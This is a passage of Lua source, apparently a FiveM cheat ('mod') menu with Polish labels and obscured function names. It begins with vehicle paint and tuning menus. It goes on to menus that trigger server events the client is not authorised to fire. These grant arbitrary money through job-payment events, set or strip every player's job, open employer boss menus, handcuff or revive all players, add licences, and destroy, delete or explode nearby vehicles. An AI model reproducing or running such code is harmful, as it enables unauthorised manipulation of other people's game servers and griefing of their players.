                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if smiecaries(dE.name, dE.id) then
                        end
                    elseif dE.id == 'neon' then
                        if smiecaries(dE.name, dE.id) then
                        end
                    elseif dE.id == 'paint' then
                        if smiecaries(dE.name, dE.id) then
                        end
                    elseif dE.id == 'wheeltypes' then
                        if smiecaries(dE.name, dE.id) then
                        end
                    elseif dE.id == 'headlight' then
                        if smiecaries(dE.name, dE.id) then
                        end
                    elseif dE.id == 'licence' then
                        if smiecaries(dE.name, dE.id) then
                        end
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for ci, dL in pairs(az) do
                            if smiecaries(dE.name, dE.id) then
                            end
                            break
                        end
                    end
                end
                if IsToggleModOn(veh, 22) then
                    xenonStatus = 'Installed'
                else
                    xenonStatus = 'Not Installed'
                end
                if piesaries('Xenon Headlight', xenonStatus) then
                    if not IsToggleModOn(veh, 22) then
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bm) do
                    if smiecaries(dE.name, dE.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = 'Installed'
                else
                    turboStatus = 'Not Installed'
                end
                if piesaries('~h~~w~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    else
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('primary') then
                smiecaries('~h~~b~-»~w~ Classic', 'classic1')
                smiecaries('~h~~b~-»~w~ Metallic', 'metallic1')
                smiecaries('~h~~b~-»~w~ Matte', 'matte1')
                smiecaries('~h~~b~-»~w~ Metal', 'metal1')
                skaza.Display()
            elseif skaza.IsMenuOpened('secondary') then
                smiecaries('~h~~b~-»~w~ Classic', 'classic2')
                smiecaries('~h~~b~-»~w~ Metallic', 'metallic2')
                smiecaries('~h~~b~-»~w~ Matte', 'matte2')
                smiecaries('~h~~b~-»~w~ Metal', 'metal2')
                skaza.Display()
            elseif skaza.IsMenuOpened('rimpaint') then
                smiecaries('~h~~b~-»~w~ Classic', 'classic3')
                smiecaries('~h~~b~-»~w~ Metallic', 'metallic3')
                smiecaries('~h~~b~-»~w~ Matte', 'matte3')
                smiecaries('~h~~b~-»~w~ Metal', 'metal3')
                skaza.Display()
            elseif skaza.IsMenuOpened('classic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metallic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('matte1') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metal1') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('classic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metallic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('matte2') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metal2') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('classic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metallic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('matte3') then
                for dK, em in pairs(bt) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('metal3') then
                for dK, em in pairs(bu) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if piesaries(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('VehicleMenu') then
                if smiecaries('~h~~b~-»~w~ ~h~~w~LSC ~w~Customs', 'LSC') then
                elseif smiecaries('~h~~b~-»~w~ ~g~Boost Autek', 'BoostMenu') then
                elseif smiecaries('~h~~b~-»~w~ Lista autek', 'CarTypes') then
                elseif smiecaries('~h~~b~-»~w~ Rozpierdol autek', 'GCT') then
                elseif smiecaries('~h~~b~-»~w~ Przyczepy pierdolonexd', 'MainTrailer') then
                elseif piesaries('~h~Zresp ~r~Customowe ~w~Auto') then
                    ca()
                elseif piesaries('~h~~r~Usun ~w~Auto') then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif piesaries('~h~~g~Napraw ~w~Auto') then
                    cc()
                elseif piesaries('~h~~g~Napraw ~w~Silnik') then
                    cd()
                elseif piesaries('~h~~g~Obroc ~w~Auto') then
                    daojosdinpatpemata()
                elseif piesaries('~h~~w~Max ~w~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif piesaries('~h~~g~Sterowane ~w~Autko') then
                    ce()
                    skaza.CloseMenu()
                elseif
                    jariesa(
                        '~h~No Fall',
                        Nofall,
                        function(dR)
                            Nofall = dR
                            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall)
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~G0d mode auta',
                        VehGod,
                        function(dR)
                            VehGod = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dR)
                            VehSpeed = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('GCT') then
                if
                    jariesa(
                        '~h~~r~Zepsuj~w~ Najblizsze auta',
                        destroyvehicles,
                        function(dR)
                            destroyvehicles = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Usun~w~ Najblizsze auta',
                        deletenearestvehicle,
                        function(dR)
                            deletenearestvehicle = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~r~Wysadz~w~ Najblizsze auta',
                        explodevehicles,
                        function(dR)
                            explodevehicles = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~p~Zabaw sie~w~ najblizszym autem',
                        fuckallcars,
                        function(dR)
                            fuckallcars = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('LuaMenu') then
                if smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Boss', 'ESXBoss') then
                elseif smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Money', 'ESXMoney') then
                elseif smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Praces', 'ESXJobs') then
                elseif smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Misc', 'ESXCustom') then
                elseif smiecaries('~h~~b~-»~w~ ~r~ESX ~w~Items', 'ESXItems') then
                elseif smiecaries('~h~~b~-»~w~ ~y~VRP ~w~Triggers', 'VRPTriggers') then
                elseif smiecaries('~h~~b~-»~w~ ~w~Misc ~w~Triggers', 'MiscTriggers') then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXJobs') then
                if piesaries('~h~Fire Wszystkich graczy') then
                    for ak = 0, 128 do
                        jebacariesa('NB:destituerplayer', GetPlayerServerId(ak))
                        UnemployedPlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~w~Police ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'police', 3)
                        PolicePlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~o~Mecano ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'mecano', 3)
                        MecanoPlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~y~Taxi ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'taxi', 3)
                        TaxiPlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~r~Ambulance ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'ambulance', 3)
                        AmbulancePlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~g~Real Estate ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'realestateagent', 3)
                        RealEstateAgentPlayers()
                    end
                elseif piesaries('~h~Ustaw wszystkim ~r~Car ~w~Dealer ~w~Prace') then
                    for ak = 0, 128 do
                        jebacariesa('NB:recruterplayer', GetPlayerServerId(ak), 'cardealer', 3)
                        CarDealerPlayers()
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXBoss') then
                if piesaries('~c~~h~Mechanic~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~w~~h~Police~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'police',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~r~~h~Ambulance~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~y~~h~Taxi~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~g~~h~Real Estate~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                            skaza.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                            skaza.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~o~~h~Car Dealer~w~ Menu szefa') then
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                            skaza.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                            skaza.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(er, es)
                            es.close()
                        end
                    )
                    chujaries(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(er, es)
                            es.close()
                        end
                    )
                    skaza.CloseMenu()
                elseif piesaries('~y~~h~Custom~w~ Menu szefa') then
                    local m = KeyboardInput('Enter custom Menu szefa job name', '', 100)
                    if m ~= '' then
                        chujaries(
                            'esx_society:openBossMenu',
                            m,
                            function(en, eo)
                                skaza.close()
                            end
                        )
                        chujaries(
                            'esx_society:openBossMenu',
                            m,
                            function(ep, eq)
                                eq.close()
                            end
                        )
                        chujaries(
                            'esx_society:openBossMenu',
                            m,
                            function(er, es)
                                es.close()
                            end
                        )
                        skaza.CloseMenu()
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXMoney') then
                if piesaries('~h~~o~Automatyczne pieniadze ~r~ UWAGA!') then
                    automaticmoneyesx()
                elseif piesaries('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_jobs:caution', 'give_back', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Advanced Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'esx_advancedgarage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'eden_garage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_fueldelivery:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_carthief:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'esx_dmvschool:pay',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif piesaries('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_godirtyjob:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_pizza:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_ranger:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_garbagejob:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_carthief:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_truckerjob:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('AdminMenu:giveBank', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('AdminMenu:giveCash', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_gopostaljob:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_banksecurity:pay', m)
                    end
                elseif piesaries('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        jebacariesa('esx_slotmachine:sv:2', m)
                    end
                elseif
                    jariesa(
                        '~g~~h~ESX Hunting~y~ reward',
                        huntspam,
                        function(dR)
                            huntspam = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('ESXCustom') then
                if piesaries('~h~Nakarm') then
                    chujaries('esx_status:set', 'hunger', 1000000)
                elseif piesaries('~h~Napoj') then
                    chujaries('esx_status:set', 'thirst', 1000000)
                elseif piesaries('~g~~h~ESX ~r~Revive') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                                chujaries('esx_ambulancejob:revive', GetPlayerServerId(i))
                                chujaries('esx_ambulancejob:revive', GetPlayerServerId(i))
                            end
                        else
                            chujaries('esx_ambulancejob:revive', f)
                            chujaries('esx_ambulancejob:revive', f)
                        end
                    end
                elseif piesaries('~g~~h~ESX ~w~Zakuj') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                                jebacariesa('esx_policejob:handcuff', GetPlayerServerId(i))
                                chujaries('esx_policejob:handcuff', GetPlayerServerId(i))
                            end
                        else
                            chujaries('esx_policejob:handcuff', f)
                            jebacariesa('esx_policejob:handcuff', f)
                        end
                    end
                elseif piesaries('~h~Zdobadz prawko') then
                    jebacariesa('esx_dmvschool:addLicense', 'dmv')
                    jebacariesa('esx_dmvschool:addLicense', 'drive')
